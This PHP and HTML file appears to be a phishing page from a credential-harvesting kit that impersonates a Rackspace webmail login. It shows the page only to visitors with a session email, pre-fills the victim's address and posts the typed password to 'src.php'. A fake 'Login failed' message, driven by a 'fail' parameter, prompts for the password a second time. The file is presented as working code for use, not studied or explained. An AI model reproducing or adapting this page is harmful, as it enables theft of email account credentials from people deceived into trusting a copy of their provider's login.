<?php
error_reporting(0);
session_start();
ob_start();

function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}


if (loggedin()) {
} else {
    die();
}
        
$email = @$_SESSION['email'];

$error = @$_GET['fail'];
if ($error == "1") {
    $formaction = "src.php";
    $showerror = "block";
} elseif ($error == "sec") {
    $formaction = "src.php?svr=tf";
    $showerror = "block";
} else {
        $formaction = "src.php";
    $showerror = "none";
}


?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<!-- Inserted by control panel -->
<script language="JavaScript" src="http://webmail.emailsrvr.com/mail/js/login.js"></script>

<!--
***************************************************************************
* Edit the Page Title between the <TITLE> tags below
* YOU MAY EDIT THIS SECTION
*************************************************************************** -->
<title>Webmail - Login</title>


<!--
***************************************************************************
* Edit the Colors and Fonts between the <STYLE> tags below
* YOU MAY EDIT THIS SECTION
*************************************************************************** -->
<style>
<!--
/* Page Body properites */
.loginBodyBGCOLOR {
background-color: #FFFFFF;
margin: 0px;
}
/* 1-pixel line color for above and below content */
.login1pxBGCOLOR {
background-color: #999999;
}
/* 1-pixel line color for around the login form */
.loginFormBorderBGCOLOR {
background-color: #ADADAD;
}
/* Background color for the left side of the page */
.loginLeftBGCOLOR {
background-color: #D9E8F0;
}
/* Background color/gradient for the right side of the page */
.loginRightBGCOLOR {
background-color: #4475A5;
background-image: url("/mail/images/login/login-bg.gif");
background-repeat: repeat-y;
filter: progid:DXImageTransform.Microsoft.Gradient(startColorStr='#D9E8F0', endColorStr='#4475A5', gradientType='1');
}
/* Font used in login form */
font.loginFormFont {
font-family: Arial, Helvetica, Sans-serif;
font-size: 8.5pt;
color:#333333;
}
/* Font used for title text on right side of page */
font.loginTitleFont {
font-family: Arial, Helvetica, Sans-serif;
font-size: 9.5pt;
font-weight: bold;
color:#333333;
}
/* Font used for title text on right side of page - when its a link */
font.loginTitleFont a {
color:#333333;
}
/* Font used for normal text on right side of page */
font.loginTextFont {
font-family: Arial, Helvetica, Sans-serif;
font-size: 8.5pt;
color:#333333;
}
/* Font used for normal text on right side of page - when its a link */
font.loginTextFont a {
color:#333333;
}
/* Font used for displaying login errors */
font.loginAlertFont {
font-family: Arial, Helvetica, Sans-serif;
font-size: 8.5pt;
font-weight: bold;
color:#990000;
}
/* Form input field properties (text fields and buttons) */
input.small {
font-family: Arial, Helvetica, Sans-serif;
font-size: 8.0pt;
}
/* Form input field properties (drop-down fields) */
select.small {
font-family: Arial, Helvetica, Sans-serif;
font-size: 8.0pt;
}
//-->
</style>


<!--
***************************************************************************
* Start the Main Content
* WARNING: do not edit this section unless you know what you are doing
*************************************************************************** -->
</head>
<body class="loginBodyBGCOLOR" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<!--
***************************************************************************
* Insert HTML for the Header below
* YOU MAY EDIT THIS SECTION
*************************************************************************** -->
<!--HEADER HERE--><br>

<!--
***************************************************************************
* Start the Main Table and Login Form
* WARNING: do not edit this section unless you know what you are doing
*************************************************************************** -->
<table cellpadding="0" cellspacing="0" border="0" width="100%">
 <tbody><tr>
  <td class="login1pxBGCOLOR" colspan="4"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="1"></td>
 </tr>
 <tr>
  <td class="loginLeftBGCOLOR"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="26" height="1"></td>
  <td class="loginLeftBGCOLOR">
   <table cellspacing="0" cellpadding="0" border="0" bgcolor="#FFFFFF">
    <form name="loginForm" action="<?php echo "$formaction"; ?>" method="POST" onsubmit="submitForm()">
    <tbody><tr>
     <td class="loginLeftBGCOLOR" colspan="5"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="27"></td>
    </tr>
    <tr>
     <td colspan="2" rowspan="2" class="loginLeftBGCOLOR"><img src="http://webmail.emailsrvr.com/mail/images/login/login-boxTopLeft.gif" width="10" height="10"></td>
     <td height="1" class="loginFormBorderBGCOLOR"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="1"></td>
     <td colspan="2" rowspan="2" class="loginLeftBGCOLOR"><img src="http://webmail.emailsrvr.com/mail/images/login/login-boxTopRight.gif" width="10" height="10"></td>
    </tr>
    <tr>
     <!--ROWSPAN x 2-->
     <td height="9"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="9"></td>
     <!--ROWSPAN x 2-->
    </tr>
    <tr>
     <td width="1" class="loginFormBorderBGCOLOR"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="1"></td>
     <td width="9"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="9" height="1"></td>
     <td valign="TOP" align="LEFT" nowrap="">
     <script language="JavaScript">
      <!--
      //Find out if previous login failed
      var loginFailed = getQueryVariable('fail');
      if (loginFailed == '1') {
        document.write('<FONT CLASS="loginAlertFont">Login failed.<BR><BR></FONT>');
      }
      //-->
      </script>
      
      
      
      <div style="display: <?php echo "$showerror"; ?>;">
      <font class="loginAlertFont">Login failed.<br><br></font>
      </div>
      
      
      
      <font class="loginFormFont">Email Address:<br>
      <img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="3"><br>
      <input type="TEXT" name="user_name" class="small" value="<?php echo "$email"; ?>" style="width:147px;"><br>
      <img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="5"><br>
      Password:<br>
      <img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="3"><br>
      <input type="PASSWORD" name="password" class="small" style="width:87px;">
      <input type="hidden" name="wiz" class="small" style="width:87px;">
      <img src="http://webmail.emailsrvr.com/images/spacer.gif" width="3" height="1"><input type="SUBMIT" value="Log-In" class="small" style="width:50px;"></font>
      </form>
      
      <br><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="5"><br>
      <table cellspacing="1" cellpadding="0" border="0">
       <tbody><tr>
        <td><input type="CHECKBOX" name="remember" id="remember" style="width:12px;"></td>
        <td><label for="remember"><font class="loginFormFont">Remember my info</font></label></td>
       </tr>
       <input type="HIDDEN" name="useSSL" id="useSSL" value="">
       <tr>
        <td colspan="3"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="5"></td>
       </tr>
      </tbody></table>
      
     </td>
     <td width="9"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="9" height="1"></td>
     <td width="1" class="loginFormBorderBGCOLOR"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="1"></td>
    </tr>
    <tr>
     <td colspan="2" rowspan="2" class="loginLeftBGCOLOR"><img src="http://webmail.emailsrvr.com/mail/images/login/login-boxTopRight.gif" width="10" height="10"></td>
     <td height="9"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="9"></td>
     <td colspan="2" rowspan="2" class="loginLeftBGCOLOR"><img src="./rackspace_files/login-boxBotRight.gif" width="10" height="10"></td>
    </tr>
    <tr>
     <!--ROWSPAN x 2-->
     <td height="1" class="loginFormBorderBGCOLOR"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="1"></td>
     <!--ROWSPAN x 2-->
    </tr>
    <tr>
     <td class="loginLeftBGCOLOR" colspan="5"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="27"></td>
    </tr>
    
   </tbody></table>
  </td>
  <td class="loginLeftBGCOLOR"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="30" height="1"></td>
  <td class="loginRightBGCOLOR" width="99%" valign="TOP" nowrap=""><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="37"><br>

<!--
***************************************************************************
* Insert HTML for the Right Side of the page below
* YOU MAY EDIT THIS SECTION
*************************************************************************** -->
<font class="loginTitleFont"><!--TITLE HERE--></font><br>
<br>
<font class="loginTextFont"><!--TEXT HERE--></font>


<!--
***************************************************************************
* End the Main Table
* WARNING: do not edit this section unless you know what you are doing
*************************************************************************** -->
  </td>
 </tr>
 <tr>
  <td class="login1pxBGCOLOR" colspan="4"><img src="http://webmail.emailsrvr.com/images/spacer.gif" width="1" height="1"></td>
 </tr>
</tbody></table>

<!--
***************************************************************************
* Insert HTML for the Footer below
* YOU MAY EDIT THIS SECTION
*************************************************************************** -->
<!--FOOTER HERE-->

<!--
***************************************************************************
* End the page
* WARNING: do not edit this section unless you know what you are doing
*************************************************************************** -->
<!-- Inserted by control panel -->
<script language="JavaScript">
<!--
preloadForm();
//-->
</script>

</body></html>
